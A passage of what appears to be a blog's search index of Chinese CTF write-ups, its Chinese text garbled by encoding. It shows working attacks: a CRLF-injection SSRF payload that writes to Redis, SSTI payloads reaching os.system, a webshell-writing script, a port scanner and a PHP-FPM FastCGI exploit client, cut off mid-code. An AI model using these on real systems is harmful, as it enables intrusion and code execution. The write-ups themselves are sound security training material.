input(self,url=&quot;&quot;,submit=&quot;&quot;): file=open(&quot;index.html&quot;,&quot;r&quot;).read() reheaders=&quot;&quot; if cherrypy.request.method==&quot;GET&quot;: reheaders=&quot;&quot; else: url=cherrypy.request.params[&quot;url&quot;] submit=cherrypy.request.params[&quot;submit&quot;] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+&quot;&lt;br&gt;&quot; except Exception,e: reheaders=&quot;é”™è¯¯&quot;+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+&quot;&lt;br&gt;&quot; file=file.replace(&quot;&lt;?response?&gt;&quot;,reheaders) return file @cherrypy.expose def login(self,password=&quot;&quot;,submit=&quot;&quot;): pool = redis.ConnectionPool(host=&#x27;127.0.0.1&#x27;, port=6379) r = redis.Redis(connection_pool=pool) re=&quot;&quot; file=open(&quot;login.html&quot;,&quot;r&quot;).read() if cherrypy.request.method==&quot;GET&quot;: re=&quot;&quot; else: password=cherrypy.request.params[&quot;password&quot;] submit=cherrypy.request.params[&quot;submit&quot;] if r.get(&quot;admin&quot;)==password: re=open(&quot;flag&quot;,&#x27;r&#x27;).readline() else: re=&quot;Can&#x27;t find admin:&quot;+password+&quot;,fast fast fast.....&quot; file=file.replace(&quot;&lt;?response?&gt;&quot;,re) return filecherrypy.config.update(&#123;&#x27;server.socket_host&#x27;: &#x27;0.0.0.0&#x27;, &#x27;server.socket_port&#x27;: 8080, &#125;)cherrypy.quickstart(web7(),&#x27;/&#x27;) æˆ‘ä»¬æœ‰ä¸¤ä¸ªè¾“å…¥ç‚¹ï¼Œä¸€ä¸ª/inputå…è®¸æˆ‘ä»¬è¾“å…¥URLï¼Œç„¶åä¼šç”¨urllib2.urlopen()è®¿é—®æˆ‘ä»¬çš„URLã€‚è¿˜æœ‰ä¸€ä¸ª/loginï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç ï¼Œå¦‚æœä¸Redisæ•°æ®åº“ä¸­çš„å¯†ç ç›¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°Flagã€‚ å¥½äº†ï¼Œçœ‹èµ·æ¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼ŒSSRFã€‚ç„¶åé—®é¢˜æ¥äº†ï¼Œurllib2.urlopen()åªæ”¯æŒHTTP HTTPS FTP Fileè¿™å‡ ç§Schemaï¼Œæˆ‘ä»¬æ²¡æ³•ç”¨gopherï¼Œä¹Ÿå°±æ²¡æ³•æ‰“åˆ°Redisã€‚ç„¶åæˆ‘ä»¬å°±è¯•å›¾æœä¸€ä¸‹urllib2.urlopen()æ˜¯ä¸æ˜¯å‡ºè¿‡ä»€ä¹ˆæ´ï¼Œç„¶åå°±æ‰¾åˆ°è¿™ä¸ªã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯urlopen()å¤„ç†URLçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„HTTPå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹ã€‚å°±åƒè¿™æ ·ï¼š 123456789urlopen(&quot;http://127.0.0.1%0D%0A%20SLAVEOF . . . :6379/&quot;)&gt;&gt;&gt; pprint(conn.recv(300).splitlines(keepends=True))[b&#x27;GET / HTTP/1.1\\r\\n&#x27;, b&#x27;Accept-Encoding: identity\\r\\n&#x27;, b&#x27;Host: 127.0.0.1\\r\\n&#x27;, b&#x27; SLAVEOF . . . :6379\\r\\n&#x27;, b&#x27;Connection: close\\r\\n&#x27;, b&#x27;User-Agent: Python-urllib/2.7\\r\\n&#x27;, b&#x27;\\r\\n&#x27;] å¥½äº†ï¼Œæˆ‘ä»¬åªè¦åœ¨æ­£å¸¸URLä¸­æ’å…¥%0d%0aå°±å¯ä»¥äº†ã€‚æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å…¶å®éå¸¸ç®€å•ï¼šå‘Rediså†™æ•°æ®ï¼Œæ”¹æ‰adminçš„å¯†ç å°±å¥½äº†ã€‚Redisæ”¹æ•°æ®ç”¨setæŒ‡ä»¤å°±å¥½äº†ã€‚ç„¶åæ¢è¡Œç”¨%0d%0aã€‚æ‰€ä»¥ï¼ŒPayloadï¼šhttp://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo ç„¶åæˆ‘ä»¬ç™»å½•/loginï¼Œè¾“å…¥adminå°±å¯ä»¥äº†ã€‚ä¸è¿‡åŠ¨ä½œè¦å¿«ï¼Œå› ä¸ºadminå¯†ç ä¼šå®šæ—¶ä¿®æ”¹ã€‚ P.S. æ ¹æ®è¿™ç¯‡æ–‡ç« çš„æ€è·¯æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ææ˜ç™½ä¸ºä»€ä¹ˆè¦æ”¹æ•°æ®åº“çš„ä½ç½®ã€‚ flag{e48f5fcb-2ca6-471e-a1e1-c7fbb82d8bfb}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"Cherrypy","slug":"Cherrypy","permalink":"http://tiaonmmn.github.io/tags/Cherrypy/"},{"name":"CVE-2016-5699","slug":"CVE-2016-5699","permalink":"http://tiaonmmn.github.io/tags/CVE-2016-5699/"},{"name":"CRLF Injection","slug":"CRLF-Injection","permalink":"http://tiaonmmn.github.io/tags/CRLF-Injection/"}]},{"title":"PASECACTF 2019 Tornado_Casino","slug":"PASECACTF-2019-Tornado-Casino","date":"2019-09-10T08:30:34.000Z","updated":"2020-03-05T07:21:37.852Z","comments":true,"path":"2019/09/10/PASECACTF-2019-Tornado-Casino/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/10/PASECACTF-2019-Tornado-Casino/","excerpt":"ä¹…è¿çš„æ¥ä¸€é“Cryptoã€‚ ç»™å‡ºäº†ä»£ç ï¼š","text":"ä¹…è¿çš„æ¥ä¸€é“Cryptoã€‚ ç»™å‡ºäº†ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from sys import argvfrom random import getrandbitsflag = &#x27;&lt;redacted&gt;&#x27;tornado_banner = &#x27;&#x27;&#x27; 88 ,d 88 88 88 MM88MMM ,adPPYba, 8b,dPPYba, 8b,dPPYba, ,adPPYYba, ,adPPYb,88 ,adPPYba, 88 a8&quot; &quot;8a 88P&#x27; &quot;Y8 88P&#x27; `&quot;8a &quot;&quot; `Y8 a8&quot; `Y88 a8&quot; &quot;8a 88 8b d8 88 88 88 ,adPPPPP88 8b 88 8b d8 88, &quot;8a, ,a8&quot; 88 88 88 88, ,88 &quot;8a, ,d88 &quot;8a, ,a8&quot; &quot;Y888 `&quot;YbbdP&quot;&#x27; 88 88 88 `&quot;8bbdP&quot;Y8 `&quot;8bbdP&quot;Y8 `&quot;YbbdP&quot;&#x27; &#x27;&#x27;&#x27;casino_banner = &#x27;&#x27;&#x27; 88 &quot;&quot; ,adPPYba, ,adPPYYba, ,adPPYba, 88 8b,dPPYba, ,adPPYba, a8&quot; &quot;&quot; &quot;&quot; `Y8 I8[ &quot;&quot; 88 88P\\&#x27; `&quot;8a a8&quot; &quot;8a 8b ,adPPPPP88 `&quot;Y8ba, 88 88 88 8b d8 &quot;8a, ,aa 88, ,88 aa ]8I 88 88 88 &quot;8a, ,a8&quot; `&quot;Ybbd8&quot;&#x27; `&quot;8bbdP&quot;Y8 `&quot;YbbdP&quot;\\&#x27; 88 88 88 `&quot;YbbdP&quot;\\&#x27; &#x27;&#x27;&#x27;tornado_art = &#x27;&#x27;&#x27; (( &quot;####@@!!$$ )) `#####@@!$$` )) (( &#x27;####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! &#x27;@!$: &#x27;`\\ &quot;!$: /`&#x27; &#x27;\\ &#x27;!: /&#x27; &quot;\\ : /&quot; -.&quot;-/\\\\\\-.&quot;//.-&quot;/:`\\.&quot;-.JrS&quot;.&quot;-=_\\\\&quot; -.&quot;-.\\\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\\\-.&quot;.-\\&quot;.-//&#x27;&#x27;&#x27;welcome = &#x27;Welcome!\\n[1] - To slotmachine\\n[2] - Enter promocode\\n[3] - Exit\\n&#x27;&#x27;&#x27;def sltmchn_wndw(num): print(num) return &#x27;|&#x27; + &#x27;|&#x27;.join(list(hex(num)[2:].zfill(8))) + &#x27;|&#x27;slotmachine_menu = &#x27;[$] - $$$SPIN$$$\\n&#x27;print(tornado_banner)print(casino_banner)print(tornado_art)user_balance = 10#$promo = &#x27;&#x27;while True: choice1 = input(welcome) if choice1 == &#x27;1&#x27;: print(&#x27;$$$Its point of no return!$$$\\n$$$ all or nothing $$$\\n&#x27;) print(f&#x27;Your balance: &#123;user_balance&#125;&#x27;) while True: if user_balance &gt; 0: spin = input(slotmachine_menu) if spin == &#x27;$&#x27;: state = getrandbits(32) try: pff_try = int(input(&#x27;It will be: &#x27;), 16) except: exit(0) if pff_try == state: print(sltmchn_wndw(state)) print(&#x27;OMGWTF$$$$$$$$$$$$&#x27;) print(flag) exit(0) else: print(sltmchn_wndw(state)) print(&#x27;Nice try!&#x27;) user_balance -= 1 print(f&#x27;Your balance: &#123;user_balance&#125;&#x27;) else: exit(0) else: print(&#x27;Sorry!&#x27;) exit(0) elif choice1 == &#x27;2&#x27;: if not promo: promo = input(&#x27;Enter your promocode: &#x27;) if promo == &#x27;b33_1_4m_b3333&#x27;: print(&#x27;Great!&#x27;) user_balance += 1000#$ else: print(&#x27;Only once!&#x27;) elif choice1 == &#x27;3&#x27;: exit(0) æµç¨‹å¾ˆç®€å•ï¼Œæ¯æ¬¡ä»–ä¼šç”¨random.getrandbits(32)æ¥ç”Ÿæˆéšæœºæ•°ï¼Œæˆ‘ä»¬åªè¦çŒœä¸­å°±ä¼šå¾—åˆ°flagã€‚ ä¹‹å‰æˆ‘ä»¬æåˆ°è¿‡ï¼ŒPythonä¸­random.getrandbits()ä½¿ç”¨çš„æ˜¯MT19937ç®—æ³•ï¼Œå› æ­¤æˆ‘ä»¬åªè¦è·å¾—è¿ç»­çš„624ç»„éšæœºæ•°æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‡†ç¡®è·å¾—ä¸‹ä¸€ä¸ªã€‚ ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from mt19937predictor import MT19937Predictorip = &#x27;127.0.0.1&#x27;port = &#x27;25028&#x27;c = connect(ip, port)print(type(c))context.log_level = &#x27;debug&#x27;predictor = MT19937Predictor()def promo(c): c.recvuntil(&quot;Welcome&quot;) c.recvline() c.recvline() c.recvline() c.recvline() c.sendline(&#x27;2&#x27;) c.recvuntil(&#x27;Enter your promocode:&#x27;) c.sendline(&quot;b33_1_4m_b3333&quot;) print(c.recvline())result = []def attack(c): c.sendline(&quot;1&quot;) c.recvline() for i in range(625): c.sendline(&#x27;$&#x27;) c.recvuntil(&#x27;It will be:&#x27;) c.sendline(&#x27;1&#x27;) temp_result = c.recvline() result.append(int(temp_result[:-1].replace(&#x27;|&#x27;, &quot;&quot;),16))if __name__==&quot;__main__&quot;: promo(c) attack(c) for i in range(625): predictor.setrandbits(result[i],32) print(result) final=predictor.getrandbits(32) c.sendline(&#x27;$&#x27;) c.recvuntil(&#x27;It will be:&#x27;) c.sendline(hex(final)[2:]) print(c.recvline()) flag{6169ce2a-c2f5-46cf-9094-fa83b3b3c066}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"MT19937","slug":"MT19937","permalink":"http://tiaonmmn.github.io/tags/MT19937/"}]},{"title":"PASECACTF 2019 Flask_SSTI","slug":"PASECACTF-2019-Flask-SSTI","date":"2019-09-10T07:58:28.000Z","updated":"2019-12-10T12:15:12.669Z","comments":true,"path":"2019/09/10/PASECACTF-2019-Flask-SSTI/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/10/PASECACTF-2019-Flask-SSTI/","excerpt":"ä¸€é“Flask SSTIçš„é¢˜ã€‚ æ‰“å¼€åå…è®¸æˆ‘ä»¬è¾“å…¥ä¸œè¥¿ï¼Œä¼šè¿”å›ç”¨å¥‡æ€ªå­—ç¬¦åŒ…è£¹çš„æ˜µç§°ã€‚ æˆ‘ä»¬è¯•ä¸€ä¸‹{{1*2}}ï¼Œç„¶åè¿”å›2ã€‚é‚£ä¹ˆæœ‰SSTIã€‚æˆ‘ä»¬è¯»ä¸€ä¸‹configï¼Œæäº¤{{config}}ã€‚è¿”å›ç»“æœä¸­ç¡®å®æœ‰flagï¼Œä½†æ˜¯æ˜¯ä¹±ç ã€‚çœ‹æ¥è¦è¯»ä¸€ä¸‹æ–‡ä»¶äº†ã€‚","text":"ä¸€é“Flask SSTIçš„é¢˜ã€‚ æ‰“å¼€åå…è®¸æˆ‘ä»¬è¾“å…¥ä¸œè¥¿ï¼Œä¼šè¿”å›ç”¨å¥‡æ€ªå­—ç¬¦åŒ…è£¹çš„æ˜µç§°ã€‚ æˆ‘ä»¬è¯•ä¸€ä¸‹{{1*2}}ï¼Œç„¶åè¿”å›2ã€‚é‚£ä¹ˆæœ‰SSTIã€‚æˆ‘ä»¬è¯»ä¸€ä¸‹configï¼Œæäº¤{{config}}ã€‚è¿”å›ç»“æœä¸­ç¡®å®æœ‰flagï¼Œä½†æ˜¯æ˜¯ä¹±ç ã€‚çœ‹æ¥è¦è¯»ä¸€ä¸‹æ–‡ä»¶äº†ã€‚ Fuzzä¸€ä¸‹ï¼Œå‘ç°_ã€.å’Œ'ä¸è®©ç”¨ï¼Œé‚£å°±ç”¨è¿™ä¸ªå§ï¼š{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[80][\"load\\x5Fmodule\"](\"os\")[\"system\"](\"ls\")}}ï¼Œå…¶ä¸­[80]æŒ‡çš„æ˜¯_frozen_importlib.BuiltinImporterã€‚è¿™æ ·æˆ‘ä»¬ä¸ä¼šå¾—åˆ°è¾“å‡ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¤–éƒ¨VPSï¼Œwgetä¸€ä¸ªæ–‡ä»¶ã€‚ ç„¶åæˆ‘ä»¬å¾—åˆ°app.pyï¼Œè¯»æ–‡ä»¶ã€‚{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[91][\"get\\x5Fdata\"](0, \"app\\x2Epy\")}}ï¼Œå°±å¯ä»¥å¾—åˆ°app.pyæ–‡ä»¶å†…å®¹ã€‚åæ¨flagå³å¯ã€‚ flag{cf97ac55-0329-4867-bbbe-2fad08c6009b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"BUUOJåˆ·é¢˜-Web-ctf473831530_2018_web_virink_web","slug":"BUUOJåˆ·é¢˜-Web-ctf473831530-2018-web-virink-web","date":"2019-09-09T04:21:12.000Z","updated":"2019-12-10T12:15:12.596Z","comments":true,"path":"2019/09/09/BUUOJåˆ·é¢˜-Web-ctf473831530-2018-web-virink-web/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/","excerpt":"è¿™é¢˜æ˜¯CTFå­¦ä¹ äº¤æµç¾¤ï¼ˆ473831530ï¼‰çš„å…¥ç¾¤é¢˜ã€‚ä¸Šæ¥å°±ç»™äº†æºç å•Šã€‚","text":"è¿™é¢˜æ˜¯CTFå­¦ä¹ äº¤æµç¾¤ï¼ˆ473831530ï¼‰çš„å…¥ç¾¤é¢˜ã€‚ä¸Šæ¥å°±ç»™äº†æºç å•Šã€‚ 1234567891011&lt;?php $sandbox = &#x27;/www/sandbox/&#x27; . md5(&#x27;orange&#x27; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]); mkdir($sandbox); chdir($sandbox); if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 20) &#123; exec($_GET[&#x27;cmd&#x27;]); &#125; else if (isset($_GET[&#x27;reset&#x27;])) &#123; exec(&#x27;/bin/rm -rf &#x27; . $sandbox); &#125; echo &quot;&lt;br /&gt; IP : &#123;\\$_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;&quot;;?&gt; 20ä¸ªå­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œä¸”è¦è·¨æœºå™¨æ“ä½œï¼Œæˆ‘ä»¬æ˜¯ä¸€å®šéœ€è¦ä¸€ä¸ªWebshellçš„ã€‚å¯æ˜¯å†™ä¸è¿›å»ã€‚å‚è€ƒè¿™ä¸ªå’Œè¿™ä¸ªï¼Œæˆ‘ä»¬æ€è·¯å°±æ˜ç¡®äº†ï¼šåˆ©ç”¨1=&gt;filenameçš„ç‰¹æ€§åˆ›å»ºç‰¹æ®Šçš„æ–‡ä»¶ï¼Œç„¶åls -tråˆ—æ–‡ä»¶æ‹¼å‡ºå®Œæ•´çš„shellã€‚ls -træ˜¯æŒ‰ç…§æ–‡ä»¶åˆ›å»ºæ—¶é—´é¡ºåºå€’åºåˆ—æ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬çš„Shellå¸¦æœ‰å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼Œè€ƒè™‘è½¬ä¹‰çš„é—®é¢˜ï¼Œæˆ‘ä»¬å†å¥—ä¸€å±‚echoå³å¯ã€‚ å³æˆ‘ä»¬è¦å†™å…¥çš„å†…å®¹æ˜¯echo '&lt;?php eval($_GET[c]);' &gt; 2.txtï¼Œå¯ä»¥æ‹†æˆå¦‚ä¸‹å‡ æ®µï¼š echo\\ \\\\ \\'\\&lt;\\?php \\\\ eval\\( \\$_GET\\[c\\]\\) \\;\\'\\&gt;2.txt æ¯ä¸€ä¸ªæ–‡ä»¶åä¸­æœ‰ç©ºæ ¼çš„éƒ½éœ€è¦åœ¨è¡Œå°¾åŠ ä¸Š\\\\ã€‚ æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹æ•ˆæœï¼š 123456789101112131415161718192021222324252627282930import requestsbase_url = &#x27;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&#x27;def exec_cmd2(c): # exec cmd my_params = &#123; &#x27;cmd&#x27;: c &#125; r = requests.get(base_url, params=my_params) print(&#x27;exec cmd2&#x27;, c, r)def write_webshell(): filename = [r&#x27;&gt;echo\\ \\\\&#x27;, r&quot;&gt;\\&#x27;\\&lt;\\?php \\\\&quot;, r&#x27;&gt;eval\\(&#x27;, r&#x27;&gt;\\$_GET\\[c\\]\\)&#x27;, r&quot;&gt;\\;\\&#x27;\\&gt;2.php&quot;] for i in filename: my_params = &#123; &#x27;cmd&#x27;: i &#125; r = requests.get(base_url, params=my_params) print(i, r.status_code) cmd_list = [&#x27;ls -tr&gt;1.sh&#x27;, &#x27;sh 1.sh&#x27;] for i in cmd_list: exec_cmd2(i)if __name__ == &#x27;__main__&#x27;: write_webshell() print(&#x27;ok&#x27;) è®¿é—®/sandbox/XXX/2.phpå³å¯æ‹¿åˆ°Shellã€‚æˆ‘ä»¬cat /flagå‘ç°æ˜¯ä¸ªå‡çš„ã€‚ä¸‹ä¸€æ­¥æ‰«ä¸€ä¸‹å†…ç½‘ã€‚Hintä¸­æç¤ºæˆ‘ä»¬å¯ä»¥ç”¨Python3ã€‚ç„¶è€Œå‘ç°è„šæœ¬å¤ªæ…¢äº†ï¼Œæˆ‘å°±æ‰‹åŠ¨æ‰«äº†ï¼Œåšé¢˜æ—¶æœåŠ¡å™¨IPæ˜¯172.64.152.3ï¼Œç„¶åå‘ç°172.64.152.4æœ‰HTTPå›åº”ã€‚æˆ‘ä»¬æ‰«ç«¯å£ã€‚ 12345678910111213141516171819import socketdef foo(): with open(&#x27;active_port.txt&#x27;,&#x27;at&#x27;) as f: for i in range(65535+1): ip = &#x27;172.64.152.4&#x27; try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,i)) s.close() f.writelines(str(i)+&#x27;\\n&#x27;) except socket.error: pass f.close() passif __name__ == &#x27;__main__&#x27;: foo() print(&#x27;ok&#x27;) ç„¶åå‘ç°80 873 9000ç«¯å£å¼€æ”¾ã€‚873å¯¹åº”Rsyncï¼Œ9000å¯¹åº”FPMã€‚æˆ‘ä»¬å…ˆè¯•è¯•9000çš„FPMæ¼æ´ã€‚å‚è€ƒè¿™ä¸ªã€‚ExPå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, 